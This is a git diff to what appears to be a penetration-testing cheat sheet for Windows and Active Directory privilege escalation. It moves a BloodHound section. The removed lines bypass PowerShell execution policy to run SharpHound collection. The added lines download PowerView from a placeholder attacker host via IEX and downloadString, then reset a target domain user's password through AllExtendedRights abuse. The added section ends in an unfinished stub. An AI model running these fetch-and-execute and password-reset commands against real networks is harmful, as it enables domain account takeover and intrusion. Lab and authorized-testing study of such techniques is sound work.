@@ -27,7 +27,6 @@ Table of Contents
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
-      * [Using BloodHound](#using-bloodhound)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
    * [Post Explotation Windows](#post-explotation-windows)
@@ -37,6 +36,8 @@ Table of Contents
       * [From Docker group to root](#from-docker-group-to-root)
       * [Retrieving data from MemCache](#retrieving-data-from-memcache)
       * [Uploading Malicious Packages to PyPi Server](#uploading-malicious-packages-to-pypi-server)
+   * [Active Directory]
+      * [Bloodhound] (#bloodhound)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
@@ -201,16 +202,6 @@ impacket-smbserver share [path] -smb2support
 ```
 
 Using this simple technique we will be able to upload as much privesc tools as we want, in a easiest way.
-
-## Using BloodHound
-BloodHound is a very useful technique of Active Directory gathering. It would be a must in every Privilege Escalation we want to perform.
-We have to download SharpHound.ps1 from its last repository *(it has been changed any times, so we have to check...)*
-```powershell
-# with our local machine sharing using any technique like python3 -m http.server or impacket-smbserver...
-Set-Execution Bypass -Scope Process
-Import-Module [PATH_TO_SHARE]\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
-```
 
 ## From DNSAdmin to Administrator
 Having this localgroup rights, it's possible to escalate to Administrator and achieve SYSTEM rights. As explained in [this link](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2), the steps to perform the privilege escalation are:
@@ -385,6 +376,22 @@ If the Output includes sentences like *"Submitting dist/evil_package-0.0.1.tar.g
 ```bash
 chmod 600 id_rsa && ssh -i id_rsa [USER]@[RHOST]
 ```
+
+# Active Directory
+
+## BloodHound
+This section will cover all the attacks that this useful tool detects.
+
+**AllExtendedRights**
+```powershell
+$ownedUser_password = ConvertTo-SecureString __KnownPassword__ -Asplain -Force
+$targetUser_password = ConvertTo-SecureString __PutHereThePassword__ -Asplain -Force
+$credential = New-Object System.Management.Automation.PSCredential('__Domain__\__User__', $ownedUser_password)
+IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/PowerView.ps1'); Set-DomainUserPassword -Identity __TargetUserName__ -AccountPassword $targetUser_password
+-Credential $credential
+```
+
+**
 
 # Pivoting
 In the current part there are explained some pivoting techniques that have been useful in many situations.
